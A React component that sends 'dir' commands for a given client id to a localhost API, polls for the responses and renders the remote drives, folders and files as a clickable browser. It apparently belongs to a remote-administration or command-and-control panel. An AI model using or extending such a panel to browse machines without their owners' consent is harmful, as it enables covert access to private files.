import React, { useState, useEffect } from "react";
import { Loading } from "./Loading";
import axios from "axios";
import { ArrowUp,Folder , Download } from "lucide-react";


async function sendFileCommand(data) {
  const url = "http://localhost/api/commands/";
  const cache_url= "http://localhost/api/command-response-by-command/"

  try {
    const headers = {
      "Content-Type": "application/json",
    };
    const response = await axios.post(cache_url, data, { headers });
    return response.data;
  } catch (error) {
  }

  try {
    const headers = {
      "Content-Type": "application/json",
    };
    const response = await axios.post(url, data, { headers });
    return response.data;
  } catch (error) {
    return { error: error.message };
  }
}

function removeDirCommand(str) {
  return str.replace(/^dir\s+/i, ""); 
}

export const UserFiles = ({ id , files, setFiles, dirHistory,setDirHistory}) => {
  const [loading, setLoading] = useState(false);
  const [fetchingId, setFetchingId] = useState(null);

  useEffect(() => {
    let interval = null;

    if (loading && fetchingId) {
      interval = setInterval(async () => {
        const url = `http://localhost/api/command-response/${fetchingId}`;
        try {
          const response = await axios.get(url);

          if (response.data && response.data.data) {
            let parsed;
            try {
              parsed =
                typeof response.data.data === "string"
                  ? JSON.parse(response.data.data)
                  : response.data.data;
            } catch (err) {
              console.error("JSON parse error:", err);
              return;
            }

            setFiles(parsed.items || []);
            setLoading(false);
            setFetchingId(null);
            clearInterval(interval);
          }
        } catch (error) {
          console.error("Error fetching command response:", error);
        }
      }, 3000);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [loading, fetchingId]);

  const handleSendFileCommandBtn = async (id, command) => {
    const data = { client: id, command: command, temp: true };
    const result = await sendFileCommand(data);
    if (!result.error) {
      setLoading(true);
      setFetchingId(result.id);
    }
    setDirHistory((prev) => [...prev, command]); // Push current command to history
  };


  if (loading) {
    return (
      <div className="p-4 centered">
        <span>Loading..</span> <Loading />
      </div>
    );
  }



  return (
    <div className="p-4">
      

      {dirHistory.length > 1 && (
            <button
              className="flex items-center gap-2  py-2.5 px-5 me-2 mb-2 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-full border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100 dark:focus:ring-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-600 dark:hover:text-white dark:hover:bg-gray-700"
              onClick={() => {
                const newHistory = [...dirHistory];
                newHistory.pop(); // Remove current directory
                const previousCommand = newHistory.pop() || "dir"; // Get previous command or default to "dir"
                setDirHistory(newHistory); // Update history
                handleSendFileCommandBtn(id, previousCommand);
              }}
            >   <ArrowUp className="w-4 h-4" />
              {removeDirCommand(dirHistory[dirHistory.length - 1])}
            </button>
          )}

      {files ? (
        <ul className="list-none list-inside">
          {files.map((file, index) => (
            <li key={index} className="mb-2">
              {(file.entry_type === "directory" || file.entry_type === "drive")  && (
                <button
                  className="flex items-center gap-2  py-2.5 px-5 me-2 mb-2 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-full border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100 dark:focus:ring-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-600 dark:hover:text-white dark:hover:bg-gray-700"
                  onClick={()=>{
                    handleSendFileCommandBtn(id, `dir ${file.path}`);
                  }}
                  
                  > <span className="font-medium">{file.name} </span> <Folder></Folder></button>)
              }
              {file.entry_type === "file"  && (
                <div className="flex items-center gap-2">
                    
                  <button
                  className="flex items-center gap-2  py-2.5 px-5 me-2 mb-2 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-full border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100 dark:focus:ring-gray-700 dark:bg-gray-800 dark:text-gray-400 dark:border-gray-600 dark:hover:text-white dark:hover:bg-gray-700"
                  > <span>{file.name}</span>  
                  <span>({file.size} Bytes)</span> 
                  <Download /></button>
                </div>
                )
              }
            </li>
          ))}
        </ul>
      ) : (
        <div>
          <h4>No Files</h4>
          <button
            className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
            onClick={() => {
              handleSendFileCommandBtn(id, "dir");
            }}
          >
            Load Drives
          </button>
        </div>
      )}
    </div>
  );
};
